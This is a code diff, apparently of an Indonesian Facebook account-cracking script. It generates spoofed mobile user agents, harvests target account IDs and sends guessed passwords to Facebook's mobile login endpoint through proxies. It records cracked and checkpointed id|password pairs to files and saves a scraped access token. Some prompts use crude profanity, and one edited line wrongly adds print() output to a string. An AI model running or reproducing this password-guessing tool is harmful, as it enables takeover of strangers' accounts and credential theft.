@@ -49,24 +49,22 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.03)
 
-for jiah in range(1000):
- aa='Mozilla/5.0 (Linux; Android'
- b=random.choice(['6','7','8','9','10','11','12'])
- c='Infinix'
- d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
- e=random.randrange(678, 9999)
- f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-# g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Instagram 259.1.0.29.104 '
- g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
- h=random.randrange(73,100)
- i='0'
- j=random.randrange(4200,4900)
- k=random.randrange(40,150)
- l='Mobile Safari/537.36[FBAN/FB4A;FBAV/222.0.0.48.113;]'
- uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-# uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
- ugen.append(uaku2)
-for bb in range(10000):
+for xd in range(10000):
+	aa='Mozilla/5.0 (Linux; Android 6.0;'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c='Coolpad'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.105 Mobile Safari/537.36'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l=' [FB_IAB/FB4A;FBAV/348.0.0.39.118;]'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+for x in range(10):
 	a='Mozilla/5.0 (Linux; U; Android 4.1.2; ro-ro; Archos 50 Platinum Build/JZO54K)'
 	b=random.randrange(100, 9999)
 	c=random.randrange(100, 9999)
@@ -81,6 +79,7 @@ for bb in range(10000):
 	l='YandexSearch/7.16'
 	ua=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 	ugen2.append(ua)
+	
 def uaku():
 	try:
 		ua=open('bbnew.txt','r').read().splitlines()
@@ -166,16 +165,16 @@ def tahun(fx):
 #------------------[ LOGO-BANNER ]-----------------#
 def banner():
 	print(f"""{h}
-||	 ██████╗ ██╗   ██╗███████╗██████╗  █████╗ ███╗   ██╗        ███╗   ███╗██╗  ██╗███████╗ $$  ||
-||	██╔════╝ ██║   ██║██╔════╝██╔══██╗██╔══██╗████╗  ██║        ████╗ ████║██║ ██╔╝██╔════╝ R   ||
-||	██║  ███╗██║   ██║███████╗██║  ██║███████║██╔██╗ ██║        ██╔████╔██║█████╔╝ ███████╗ E   ||
-||	██║   ██║██║   ██║╚════██║██║  ██║██╔══██║██║╚██╗██║        ██║╚██╔╝██║██╔═██╗ ╚════██║ C   ||
-||	╚██████╔╝╚██████╔╝███████║██████╔╝██║  ██║██║ ╚████║███████╗██║ ╚═╝ ██║██║  ██╗███████║ E   ||
-||	 ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ $$  ||
-||			|╔═╗╔═╗╦╔═  ╔═╗╦═╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╦╔═  ╔╦╗╔═╗╦╔═╔═╗╔╗╔|		    ||
-||			|║ ╦╠═╣╠╩╗  ║  ╠╦╝╠═╣║  ╠╩╗  ║ ╦╠═╣╠╩╗  ║║║╠═╣╠╩╗╠═╣║║║|		    ||
-||			|╚═╝╩ ╩╩ ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩  ╚═╝╩ ╩╩ ╩  ╩ ╩╩ ╩╩ ╩╩ ╩╝╚╝|		    ||
-====================================================================================================== 
+||   $$	 ██████╗ ██╗   ██╗███████╗██████╗  █████╗ ███╗   ██╗ $$  ||
+||    C	██╔════╝ ██║   ██║██╔════╝██╔══██╗██╔══██╗████╗  ██║ R   ||
+||    U	██║  ███╗██║   ██║███████╗██║  ██║███████║██╔██╗ ██║ E   ||
+||    A	██║   ██║██║   ██║╚════██║██║  ██║██╔══██║██║╚██╗██║ C   ||
+||    N	╚██████╔╝╚██████╔╝███████║██████╔╝██║  ██║██║ ╚████║ E   ||
+||   $$	 ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ $$  ||
+||    |╔═╗╔═╗╦╔═  ╔═╗╦═╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╦╔═  ╔╦╗╔═╗╦╔═╔═╗╔╗╔|   ||
+||    |║ ╦╠═╣╠╩╗  ║  ╠╦╝╠═╣║  ╠╩╗  ║ ╦╠═╣╠╩╗  ║║║╠═╣╠╩╗╠═╣║║║|   ||
+||    |╚═╝╩ ╩╩ ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩  ╚═╝╩ ╩╩ ╩  ╩ ╩╩ ╩╩ ╩╩ ╩╝╚╝|   ||
+===================================================================
 """)	
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
@@ -207,7 +206,7 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan kembali python agus.py!!!!{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -232,9 +231,8 @@ def menu(my_name,my_id):
 	banner()
 	ip = requests.get("https://api.ipify.org").text
 	gh = 'github.com/Al-Vino'
-	cetak(nel('\tSelamat Datang [yellow]%s[white] GUYS'%(my_name)))
-	print(f'{P}[•] Recode : AGUS-XD')
-	print(f'[•] Status : {h}Premium{P}')
+	print(f'{P}[•] Recode : AGUS-ID')
+	print(f'[•] Status : {h}Pribadi{P}')
 	print(f'[•] Your Ip : {h}{ip}{P}')
 	print('')
 	print('>> 𝟏. 𝐂𝐑𝐀𝐂𝐊 𝐏𝐔𝐁𝐋𝐈𝐊 ')
@@ -242,7 +240,7 @@ def menu(my_name,my_id):
 	print('>> 𝟑. 𝐂𝐑𝐀𝐂𝐊 𝐆𝐑𝐔𝐁 ')
 	print('>> 𝟒. 𝐂𝐑𝐀𝐂𝐊 𝐅𝐈𝐋𝐄 ')
 	print('>> 𝟓. 𝗛𝗔𝗦𝗜𝗟 𝗖𝗥𝗔𝗖𝗞  ')
-	print('>> 0. Keluar       ')
+	print(f'{M}>> 0. Keluar{x} ')
 	_____alvino__adijaya_____ = input('\n>> Pilih : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
@@ -602,44 +600,70 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-  wl = '# SETTING URUTAN ID'
-  sol().print(mark(wl, style='green'))
-  teks = '[01] Crack Dari Akun Tertua (Not Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Highly Recommended)'
-  tak = nel(teks, style='white')
-  cetak(nel(tak, title='SETTING'))
-  hu = input(x+'['+p+'f'+x+'] Pilih : ')
-  if hu in ['1','01']:
-    for bacot in id:
-      id2.append(bacot)
-  elif hu in ['2','02']:
-    for bacot in id:
-      id2.insert(0,bacot)
-  elif hu in ['3','03']:
-    for bacot in id:
-      xx = random.randint(0,len(id2))
-      id2.insert(xx,bacot)
-  else:
-    ric = '# PILIHAN TIDAK ADA DI MENU'
-    sol().print(mark(ric, style='red'))
-    exit()
-  met = '# PILIH METHOD CRACK'
-  sol().print(mark(met, style='green'))
-  ioz = '[01] Method Mobile (Fast)\n[02] Method Mbasic (Slow)'
-  gess = nel(ioz, style='white')
-  cetak(nel(gess, title='METHOD'))
-  hc = input(x+'['+p+'f'+x+'] Pilih : ')
-  if hc in ['1','01']:
-    method.append('mobile')
-  else:
-    method.append('mbasic')
-  guw = '# INGIN OPSI CRACK?'
-  sol().print(mark(guw, style='green'))
-  osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
-  if osk in ['y','Y']:
-    oprek.append('ya')
-  else:
-    oprek.append('no')
-  passwrd()
+	print(f'{x}>> 1. Akun Old ')
+	print('>> 2. Akun New ')
+	print('>> 3. Random ')
+	print('')
+	hu = input('>> Pilih : ')
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		print('>> Pilih Yang Bener Kontooll ')
+		exit()
+	print(f'>> 1. Mobile {h}(Rekomendasi){x}')
+	print('>> 2. Mbasic ')
+	print('>> 3. Touch  ')
+	print('>> 4. Mtouch ')
+	print('')
+	hc = input('>> Pilih : ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		setting()
+#	elif hc in ['2','02']:
+#		method.append('free')
+#	elif hc in ['3','03']:
+#		method.append('touch')
+	elif hc in ['4','04']:
+		method.append('mbasic')
+	else:
+		method.append('mobile')
+	print('')
+	_jembot_ = input('>> Tambahkan Aplikasi ( Y/t ) ')
+	if _jembot_ in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		back()
+	elif _jembot_ in ['y','Y']:
+		taplikasi.append('ya')
+	else:
+		taplikasi.append('no')
+	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
+		pwku=input('>> Masukkan Password Tambahan : ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
+	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
 	print(f'-<<•>>- {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} -<<•>>- ')
@@ -702,7 +726,6 @@ def crack(idf,pwv):
 	sys.stdout.write(f"\r crack {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
 	sys.stdout.flush()
 	ua =random.choice(ugen)
-	ua2 =random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -716,7 +739,7 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{M}└─ {idf}|{M}{pw} {M}• {tahun(idf)}\n')
+				print(f'\r{M}└─ {idf}|{M}{pw} {M}• {tahun(idf)}\n {K}{ua}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -742,7 +765,7 @@ def crack(idf,pwv):
 					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
 					nok=1
 					for muncul in apkaktif:
-						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
+						infoakun+= print(f'\r{M}└─ {idf}|{M}{pw} {M}• {tahun(idf)}\n {K}{ua}\n')
 						nok+=1
 
 					hit=0
